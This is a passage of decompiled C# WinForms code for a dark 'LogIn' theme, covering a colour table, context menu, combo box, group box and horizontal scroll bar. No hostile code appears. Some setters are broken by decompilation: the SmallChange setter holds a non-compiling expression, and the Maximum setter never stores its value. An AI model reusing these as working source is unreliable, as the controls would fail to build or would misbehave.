				this._SelectedColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color BackColour
		{
			get
			{
				return this._BackColour;
			}
			set
			{
				this._BackColour = value;
			}
		}

		public override Color ButtonSelectedBorder
		{
			get
			{
				return this._BackColour;
			}
		}

		public override Color CheckBackground
		{
			get
			{
				return this._BackColour;
			}
		}

		public override Color CheckPressedBackground
		{
			get
			{
				return this._BackColour;
			}
		}

		public override Color CheckSelectedBackground
		{
			get
			{
				return this._BackColour;
			}
		}

		public override Color ImageMarginGradientBegin
		{
			get
			{
				return this._BackColour;
			}
		}

		public override Color ImageMarginGradientEnd
		{
			get
			{
				return this._BackColour;
			}
		}

		public override Color ImageMarginGradientMiddle
		{
			get
			{
				return this._BackColour;
			}
		}

		public override Color MenuBorder
		{
			get
			{
				return this._BorderColour;
			}
		}

		public override Color MenuItemBorder
		{
			get
			{
				return this._BackColour;
			}
		}

		public override Color MenuItemSelected
		{
			get
			{
				return this._SelectedColour;
			}
		}

		public override Color SeparatorDark
		{
			get
			{
				return this._BorderColour;
			}
		}

		public override Color ToolStripDropDownBackground
		{
			get
			{
				return this._BackColour;
			}
		}

		public LogInColourTable()
		{
			this._BackColour = Color.FromArgb(42, 42, 42);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._SelectedColour = Color.FromArgb(47, 47, 47);
		}
	}
}

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInContextMenu : ContextMenuStrip
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _FontColour;

		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInContextMenu.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInContextMenu.__ENCList.Count == LogInContextMenu.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInContextMenu.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInContextMenu.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInContextMenu.__ENCList[num] = LogInContextMenu.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInContextMenu.__ENCList.RemoveRange(num, LogInContextMenu.__ENCList.Count - num);
						LogInContextMenu.__ENCList.Capacity = LogInContextMenu.__ENCList.Count;
					}
					LogInContextMenu.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public LogInContextMenu()
		{
			LogInContextMenu.__ENCAddToList(this);
			this._FontColour = Color.FromArgb(55, 255, 255);
			this.Renderer = new ToolStripProfessionalRenderer(new LogInColourTable());
			this.ShowCheckMargin = false;
			this.ShowImageMargin = false;
			this.ForeColor = Color.FromArgb(255, 255, 255);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			e.Graphics.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			base.OnPaint(e);
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInComboBox : ComboBox
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private int _StartIndex;

		private Color _BorderColour;

		private Color _BaseColour;

		private Color _FontColour;

		private Color _LineColour;

		private Color _SqaureColour;

		private Color _ArrowColour;

		private Color _SqaureHoverColour;

		private MouseState State;

		[Category("Colours")]
		public Color LineColour
		{
			get
			{
				return this._LineColour;
			}
			set
			{
				this._LineColour = value;
			}
		}

		[Category("Colours")]
		public Color SqaureColour
		{
			get
			{
				return this._SqaureColour;
			}
			set
			{
				this._SqaureColour = value;
			}
		}

		[Category("Colours")]
		public Color ArrowColour
		{
			get
			{
				return this._ArrowColour;
			}
			set
			{
				this._ArrowColour = value;
			}
		}

		[Category("Colours")]
		public Color SqaureHoverColour
		{
			get
			{
				return this._SqaureHoverColour;
			}
			set
			{
				this._SqaureHoverColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		public int StartIndex
		{
			get
			{
				return this._StartIndex;
			}
			set
			{
				this._StartIndex = value;
				try
				{
					base.SelectedIndex = value;
				}
				catch (Exception arg_13_0)
				{
					ProjectData.SetProjectError(arg_13_0);
					ProjectData.ClearProjectError();
				}
				this.Invalidate();
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInComboBox.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInComboBox.__ENCList.Count == LogInComboBox.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInComboBox.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInComboBox.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInComboBox.__ENCList[num] = LogInComboBox.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInComboBox.__ENCList.RemoveRange(num, LogInComboBox.__ENCList.Count - num);
						LogInComboBox.__ENCList.Capacity = LogInComboBox.__ENCList.Count;
					}
					LogInComboBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			base.OnMouseEnter(e);
			this.State = MouseState.Over;
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		protected override void OnTextChanged(EventArgs e)
		{
			base.OnTextChanged(e);
			this.Invalidate();
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			this.Invalidate();
			this.OnMouseClick(e);
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			this.Invalidate();
			base.OnMouseUp(e);
		}

		public void ReplaceItem(object sender, DrawItemEventArgs e)
		{
			e.DrawBackground();
			e.Graphics.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			checked
			{
				Rectangle rect = new Rectangle(e.Bounds.X, e.Bounds.Y, e.Bounds.Width + 1, e.Bounds.Height + 1);
				try
				{
					Graphics graphics = e.Graphics;
					bool flag = (e.State & DrawItemState.Selected) == DrawItemState.Selected;
					if (flag)
					{
						graphics.FillRectangle(new SolidBrush(this._SqaureColour), rect);
						graphics.DrawString(base.GetItemText(RuntimeHelpers.GetObjectValue(base.Items[e.Index])), this.Font, new SolidBrush(this._FontColour), 1f, (float)(e.Bounds.Top + 2));
					}
					else
					{
						graphics.FillRectangle(new SolidBrush(this._BaseColour), rect);
						graphics.DrawString(base.GetItemText(RuntimeHelpers.GetObjectValue(base.Items[e.Index])), this.Font, new SolidBrush(this._FontColour), 1f, (float)(e.Bounds.Top + 2));
					}
				}
				catch (Exception arg_13D_0)
				{
					ProjectData.SetProjectError(arg_13D_0);
					ProjectData.ClearProjectError();
				}
				e.DrawFocusRectangle();
				this.Invalidate();
			}
		}

		public LogInComboBox()
		{
			base.DrawItem += new DrawItemEventHandler(this.ReplaceItem);
			LogInComboBox.__ENCAddToList(this);
			this._StartIndex = 0;
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._BaseColour = Color.FromArgb(42, 42, 42);
			this._FontColour = Color.FromArgb(255, 255, 255);
			this._LineColour = Color.FromArgb(23, 119, 151);
			this._SqaureColour = Color.FromArgb(47, 47, 47);
			this._ArrowColour = Color.FromArgb(30, 30, 30);
			this._SqaureHoverColour = Color.FromArgb(52, 52, 52);
			this.State = MouseState.None;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = Color.Transparent;
			this.DrawMode = DrawMode.OwnerDrawFixed;
			this.DropDownStyle = ComboBoxStyle.DropDownList;
			this.Width = 163;
			this.Font = new Font("Segoe UI", 10f);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this.BackColor);
			checked
			{
				try
				{
					Rectangle rect = new Rectangle(this.Width - 25, 0, this.Width, this.Height);
					Graphics arg_7B_0 = graphics2;
					Brush arg_7B_1 = new SolidBrush(this._BaseColour);
					Rectangle rectangle = new Rectangle(0, 0, this.Width - 25, this.Height);
					arg_7B_0.FillRectangle(arg_7B_1, rectangle);
					switch (this.State)
					{
					case MouseState.None:
						graphics2.FillRectangle(new SolidBrush(this._SqaureColour), rect);
						break;
					case MouseState.Over:
						graphics2.FillRectangle(new SolidBrush(this._SqaureHoverColour), rect);
						break;
					}
					Graphics arg_109_0 = graphics2;
					Pen arg_109_1 = new Pen(this._LineColour, 2f);
					Point point = new Point(this.Width - 26, 1);
					Point arg_109_2 = point;
					Point point2 = new Point(this.Width - 26, this.Height - 1);
					arg_109_0.DrawLine(arg_109_1, arg_109_2, point2);
					try
					{
						Graphics arg_164_0 = graphics2;
						string arg_164_1 = this.Text;
						Font arg_164_2 = this.Font;
						Brush arg_164_3 = new SolidBrush(this._FontColour);
						rectangle = new Rectangle(3, 0, this.Width - 20, this.Height);
						arg_164_0.DrawString(arg_164_1, arg_164_2, arg_164_3, rectangle, new StringFormat
						{
							LineAlignment = StringAlignment.Center,
							Alignment = StringAlignment.Near
						});
					}
					catch (Exception arg_16C_0)
					{
						ProjectData.SetProjectError(arg_16C_0);
						ProjectData.ClearProjectError();
					}
					Graphics arg_1A4_0 = graphics2;
					Pen arg_1A4_1 = new Pen(this._BorderColour, 2f);
					rectangle = new Rectangle(0, 0, this.Width, this.Height);
					arg_1A4_0.DrawRectangle(arg_1A4_1, rectangle);
					Point[] array = new Point[3];
					Point[] arg_1CF_0_cp_0 = array;
					int arg_1CF_0_cp_1 = 0;
					point2 = new Point(this.Width - 17, 11);
					arg_1CF_0_cp_0[arg_1CF_0_cp_1] = point2;
					Point[] arg_1F0_0_cp_0 = array;
					int arg_1F0_0_cp_1 = 1;
					point = new Point(this.Width - 13, 5);
					arg_1F0_0_cp_0[arg_1F0_0_cp_1] = point;
					Point[] arg_212_0_cp_0 = array;
					int arg_212_0_cp_1 = 2;
					Point point3 = new Point(this.Width - 9, 11);
					arg_212_0_cp_0[arg_212_0_cp_1] = point3;
					Point[] points = array;
					graphics2.FillPolygon(new SolidBrush(this._BorderColour), points);
					graphics2.DrawPolygon(new Pen(this._ArrowColour), points);
					array = new Point[3];
					Point[] arg_267_0_cp_0 = array;
					int arg_267_0_cp_1 = 0;
					point3 = new Point(this.Width - 17, 15);
					arg_267_0_cp_0[arg_267_0_cp_1] = point3;
					Point[] arg_289_0_cp_0 = array;
					int arg_289_0_cp_1 = 1;
					point2 = new Point(this.Width - 13, 21);
					arg_289_0_cp_0[arg_289_0_cp_1] = point2;
					Point[] arg_2AB_0_cp_0 = array;
					int arg_2AB_0_cp_1 = 2;
					point = new Point(this.Width - 9, 15);
					arg_2AB_0_cp_0[arg_2AB_0_cp_1] = point;
					Point[] points2 = array;
					graphics2.FillPolygon(new SolidBrush(this._BorderColour), points2);
					graphics2.DrawPolygon(new Pen(this._ArrowColour), points2);
				}
				catch (Exception arg_2DD_0)
				{
					ProjectData.SetProjectError(arg_2DD_0);
					ProjectData.ClearProjectError();
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
				graphics2 = null;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInGroupBox : ContainerControl
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _MainColour;

		private Color _HeaderColour;

		private Color _TextColour;

		private Color _BorderColour;

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Colours")]
		public Color HeaderColour
		{
			get
			{
				return this._HeaderColour;
			}
			set
			{
				this._HeaderColour = value;
			}
		}

		[Category("Colours")]
		public Color MainColour
		{
			get
			{
				return this._MainColour;
			}
			set
			{
				this._MainColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInGroupBox.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInGroupBox.__ENCList.Count == LogInGroupBox.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInGroupBox.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInGroupBox.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInGroupBox.__ENCList[num] = LogInGroupBox.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInGroupBox.__ENCList.RemoveRange(num, LogInGroupBox.__ENCList.Count - num);
						LogInGroupBox.__ENCList.Capacity = LogInGroupBox.__ENCList.Count;
					}
					LogInGroupBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public LogInGroupBox()
		{
			LogInGroupBox.__ENCAddToList(this);
			this._MainColour = Color.FromArgb(47, 47, 47);
			this._HeaderColour = Color.FromArgb(42, 42, 42);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			Size size = new Size(160, 110);
			this.Size = size;
			this.Font = new Font("Segoe UI", 10f, FontStyle.Bold);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(Color.FromArgb(54, 54, 54));
			Graphics arg_58_0 = graphics2;
			Brush arg_58_1 = new SolidBrush(this._MainColour);
			Rectangle rect = new Rectangle(0, 28, this.Width, this.Height);
			arg_58_0.FillRectangle(arg_58_1, rect);
			Graphics arg_A0_0 = graphics2;
			Brush arg_A0_1 = new SolidBrush(this._HeaderColour);
			checked
			{
				rect = new Rectangle(0, 0, (int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 7f))), 28);
				arg_A0_0.FillRectangle(arg_A0_1, rect);
				Graphics arg_CF_0 = graphics2;
				string arg_CF_1 = this.Text;
				Font arg_CF_2 = this.Font;
				Brush arg_CF_3 = new SolidBrush(this._TextColour);
				Point point = new Point(5, 5);
				arg_CF_0.DrawString(arg_CF_1, arg_CF_2, arg_CF_3, point);
				Point[] array = new Point[7];
				Point[] arg_F1_0_cp_0 = array;
				int arg_F1_0_cp_1 = 0;
				point = new Point(0, 0);
				arg_F1_0_cp_0[arg_F1_0_cp_1] = point;
				Point[] arg_132_0_cp_0 = array;
				int arg_132_0_cp_1 = 1;
				Point point2 = new Point((int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 7f))), 0);
				arg_132_0_cp_0[arg_132_0_cp_1] = point2;
				Point[] arg_174_0_cp_0 = array;
				int arg_174_0_cp_1 = 2;
				Point point3 = new Point((int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 7f))), 28);
				arg_174_0_cp_0[arg_174_0_cp_1] = point3;
				Point[] arg_195_0_cp_0 = array;
				int arg_195_0_cp_1 = 3;
				Point point4 = new Point(this.Width - 1, 28);
				arg_195_0_cp_0[arg_195_0_cp_1] = point4;
				Point[] arg_1BC_0_cp_0 = array;
				int arg_1BC_0_cp_1 = 4;
				Point point5 = new Point(this.Width - 1, this.Height - 1);
				arg_1BC_0_cp_0[arg_1BC_0_cp_1] = point5;
				Point[] arg_1DC_0_cp_0 = array;
				int arg_1DC_0_cp_1 = 5;
				Point point6 = new Point(1, this.Height - 1);
				arg_1DC_0_cp_0[arg_1DC_0_cp_1] = point6;
				Point[] arg_1F5_0_cp_0 = array;
				int arg_1F5_0_cp_1 = 6;
				Point point7 = new Point(1, 1);
				arg_1F5_0_cp_0[arg_1F5_0_cp_1] = point7;
				Point[] points = array;
				graphics2.DrawLines(new Pen(this._BorderColour), points);
				Graphics arg_263_0 = graphics2;
				Pen arg_263_1 = new Pen(this._BorderColour, 2f);
				point7 = new Point(0, 28);
				Point arg_263_2 = point7;
				point6 = new Point((int)Math.Round((double)(unchecked(graphics2.MeasureString(this.Text, this.Font).Width + 7f))), 28);
				arg_263_0.DrawLine(arg_263_1, arg_263_2, point6);
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DefaultEvent("Scroll")]
	public class LogInHorizontalScrollBar : Control
	{
		public delegate void ScrollEventHandler(object sender);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private int ThumbMovement;

		private Rectangle LSA;

		private Rectangle RSA;

		private Rectangle Shaft;

		private Rectangle Thumb;

		private bool ShowThumb;

		private bool ThumbPressed;

		private int _ThumbSize;

		private int _Minimum;

		private int _Maximum;

		private int _Value;

		private int _SmallChange;

		private int _ButtonSize;

		private int _LargeChange;

		private Color _ThumbBorder;

		private Color _LineColour;

		private Color _ArrowColour;

		private Color _BaseColour;

		private Color _ThumbColour;

		private Color _ThumbSecondBorder;

		private Color _FirstBorder;

		private Color _SecondBorder;

		private bool ThumbDown;

		private LogInHorizontalScrollBar.ScrollEventHandler ScrollEvent;

		public event LogInHorizontalScrollBar.ScrollEventHandler Scroll
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.ScrollEvent = (LogInHorizontalScrollBar.ScrollEventHandler)Delegate.Combine(this.ScrollEvent, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.ScrollEvent = (LogInHorizontalScrollBar.ScrollEventHandler)Delegate.Remove(this.ScrollEvent, value);
			}
		}

		[Category("Colours")]
		public Color ThumbBorder
		{
			get
			{
				return this._ThumbBorder;
			}
			set
			{
				this._ThumbBorder = value;
			}
		}

		[Category("Colours")]
		public Color LineColour
		{
			get
			{
				return this._LineColour;
			}
			set
			{
				this._LineColour = value;
			}
		}

		[Category("Colours")]
		public Color ArrowColour
		{
			get
			{
				return this._ArrowColour;
			}
			set
			{
				this._ArrowColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbColour
		{
			get
			{
				return this._ThumbColour;
			}
			set
			{
				this._ThumbColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbSecondBorder
		{
			get
			{
				return this._ThumbSecondBorder;
			}
			set
			{
				this._ThumbSecondBorder = value;
			}
		}

		[Category("Colours")]
		public Color FirstBorder
		{
			get
			{
				return this._FirstBorder;
			}
			set
			{
				this._FirstBorder = value;
			}
		}

		[Category("Colours")]
		public Color SecondBorder
		{
			get
			{
				return this._SecondBorder;
			}
			set
			{
				this._SecondBorder = value;
			}
		}

		public int Minimum
		{
			get
			{
				return this._Minimum;
			}
			set
			{
				this._Minimum = value;
				bool flag = value > this._Value;
				if (flag)
				{
					this._Value = value;
				}
				flag = (value > this._Maximum);
				if (flag)
				{
					this._Maximum = value;
				}
				this.InvalidateLayout();
			}
		}

		public int Maximum
		{
			get
			{
				return this._Maximum;
			}
			set
			{
				bool flag = value < this._Value;
				if (flag)
				{
					this._Value = value;
				}
				flag = (value < this._Minimum);
				if (flag)
				{
					this._Minimum = value;
				}
			}
		}

		public int Value
		{
			get
			{
				return this._Value;
			}
			set
			{
				bool flag = value == this._Value;
				if (!flag)
				{
					flag = (value < this._Minimum);
					if (flag)
					{
						this._Value = this._Minimum;
					}
					else
					{
						flag = (value > this._Maximum);
						if (flag)
						{
							this._Value = this._Maximum;
						}
						else
						{
							this._Value = value;
						}
					}
					this.InvalidatePosition();
					LogInHorizontalScrollBar.ScrollEventHandler scrollEvent = this.ScrollEvent;
					flag = (scrollEvent != null);
					if (flag)
					{
						scrollEvent(this);
					}
				}
			}
		}

		public int SmallChange
		{
			get
			{
				return this._SmallChange;
			}
			set
			{
				bool flag = value < 1;
				if (!flag)
				{
					flag = (value > ((-(((this._SmallChange == value) > false) ? 1 : 0)) ? 1 : 0));
					if (flag)
					{
					}
				}
			}
		}

		public int LargeChange
		{
			get
			{
				return this._LargeChange;
			}
			set
			{
				bool flag = value < 1;
				if (!flag)
				{
					this._LargeChange = value;
				}
			}
		}

		public int ButtonSize
		{
			get
			{
				return this._ButtonSize;
			}
			set
			{
				bool flag = value < 16;
				if (flag)
				{
					this._ButtonSize = 16;
				}
				else
				{
					this._ButtonSize = value;
				}
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInHorizontalScrollBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInHorizontalScrollBar.__ENCList.Count == LogInHorizontalScrollBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInHorizontalScrollBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInHorizontalScrollBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInHorizontalScrollBar.__ENCList[num] = LogInHorizontalScrollBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInHorizontalScrollBar.__ENCList.RemoveRange(num, LogInHorizontalScrollBar.__ENCList.Count - num);
						LogInHorizontalScrollBar.__ENCList.Capacity = LogInHorizontalScrollBar.__ENCList.Count;
					}
					LogInHorizontalScrollBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnSizeChanged(EventArgs e)
		{
			this.InvalidateLayout();
		}

		private void InvalidateLayout()
		{
			this.LSA = new Rectangle(0, 1, 0, this.Height);
			checked
			{
				this.Shaft = new Rectangle(this.LSA.Right + 1, 0, this.Width - 3, this.Height);
				this.ShowThumb = (this._Maximum - this._Minimum != 0);
				this.Thumb = new Rectangle(0, 1, this._ThumbSize, this.Height - 3);
				LogInHorizontalScrollBar.ScrollEventHandler scrollEvent = this.ScrollEvent;
				bool flag = scrollEvent != null;
				if (flag)
				{
					scrollEvent(this);
				}
				this.InvalidatePosition();
			}
		}

		private void InvalidatePosition()
		{
			this.Thumb.X = checked((int)Math.Round(unchecked(checked((double)(this._Value - this._Minimum) / (double)(this._Maximum - this._Minimum)) * (double)(checked(this.Shaft.Width - this._ThumbSize)) + 1.0)));
			this.Invalidate();
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left && this.ShowThumb;
			checked
			{
				if (flag)
				{
					bool flag2 = this.LSA.Contains(e.Location);
					if (flag2)
					{
						this.ThumbMovement = this._Value - this._SmallChange;
					}
					else
					{
						flag2 = this.RSA.Contains(e.Location);
						if (flag2)
						{
							this.ThumbMovement = this._Value + this._SmallChange;
						}
						else
						{
							flag2 = this.Thumb.Contains(e.Location);
							if (flag2)
							{
								this.ThumbDown = true;
								return;
							}
							flag2 = (e.X < this.Thumb.X);
							if (flag2)
							{
								this.ThumbMovement = this._Value - this._LargeChange;
							}
							else
							{
								this.ThumbMovement = this._Value + this._LargeChange;
							}
						}
					}
					this.Value = Math.Min(Math.Max(this.ThumbMovement, this._Minimum), this._Maximum);
					this.InvalidatePosition();
				}
			}
		}

		protected override void OnMouseMove(MouseEventArgs e)
		{
			bool flag = this.ThumbDown && this.ShowThumb;
			checked
			{
				if (flag)
				{
					int num = e.X - this.LSA.Width - this._ThumbSize / 2;
					int num2 = this.Shaft.Width - this._ThumbSize;
					this.ThumbMovement = (int)Math.Round(unchecked((double)num / (double)num2 * (double)(checked(this._Maximum - this._Minimum)))) + this._Minimum;
					this.Value = Math.Min(Math.Max(this.ThumbMovement, this._Minimum), this._Maximum);
					this.InvalidatePosition();
				}
			}
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			this.ThumbDown = false;
		}

		public LogInHorizontalScrollBar()
		{
			LogInHorizontalScrollBar.__ENCAddToList(this);
			this._ThumbSize = 24;
			this._Minimum = 0;
			this._Maximum = 100;
			this._Value = 0;
			this._SmallChange = 1;
			this._ButtonSize = 16;
			this._LargeChange = 10;
			this._ThumbBorder = Color.FromArgb(35, 35, 35);
			this._LineColour = Color.FromArgb(23, 119, 151);
			this._ArrowColour = Color.FromArgb(37, 37, 37);
			this._BaseColour = Color.FromArgb(47, 47, 47);
			this._ThumbColour = Color.FromArgb(55, 55, 55);
			this._ThumbSecondBorder = Color.FromArgb(65, 65, 65);
			this._FirstBorder = Color.FromArgb(55, 55, 55);
			this._SecondBorder = Color.FromArgb(35, 35, 35);
			this.ThumbDown = false;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.Selectable | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.Height = 18;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(Color.FromArgb(47, 47, 47));
			Point[] array = new Point[10];
			Point[] arg_66_0_cp_0 = array;
			int arg_66_0_cp_1 = 0;
			checked
			{
				Point point = new Point(5, (int)Math.Round((double)this.Height / 2.0));
				arg_66_0_cp_0[arg_66_0_cp_1] = point;
				Point[] arg_96_0_cp_0 = array;
				int arg_96_0_cp_1 = 1;
				Point point2 = new Point(13, (int)Math.Round((double)this.Height / 4.0));
				arg_96_0_cp_0[arg_96_0_cp_1] = point2;
				Point[] arg_D0_0_cp_0 = array;
				int arg_D0_0_cp_1 = 2;
				Point point3 = new Point(13, (int)Math.Round(unchecked((double)this.Height / 2.0 - 2.0)));
				arg_D0_0_cp_0[arg_D0_0_cp_1] = point3;
				Point[] arg_111_0_cp_0 = array;
				int arg_111_0_cp_1 = 3;
				Point point4 = new Point(this.Width - 13, (int)Math.Round(unchecked((double)this.Height / 2.0 - 2.0)));
				arg_111_0_cp_0[arg_111_0_cp_1] = point4;
				Point[] arg_148_0_cp_0 = array;
				int arg_148_0_cp_1 = 4;
				Point point5 = new Point(this.Width - 13, (int)Math.Round((double)this.Height / 4.0));
				arg_148_0_cp_0[arg_148_0_cp_1] = point5;
				Point[] arg_17E_0_cp_0 = array;
				int arg_17E_0_cp_1 = 5;
				Point point6 = new Point(this.Width - 5, (int)Math.Round((double)this.Height / 2.0));
				arg_17E_0_cp_0[arg_17E_0_cp_1] = point6;
				Point[] arg_1C7_0_cp_0 = array;
				int arg_1C7_0_cp_1 = 6;
				Point point7 = new Point(this.Width - 13, (int)Math.Round(unchecked((double)this.Height - (double)this.Height / 4.0 - 1.0)));
				arg_1C7_0_cp_0[arg_1C7_0_cp_1] = point7;
				Point[] arg_208_0_cp_0 = array;
				int arg_208_0_cp_1 = 7;
				Point point8 = new Point(this.Width - 13, (int)Math.Round(unchecked((double)this.Height / 2.0 + 2.0)));
				arg_208_0_cp_0[arg_208_0_cp_1] = point8;
				Point[] arg_242_0_cp_0 = array;
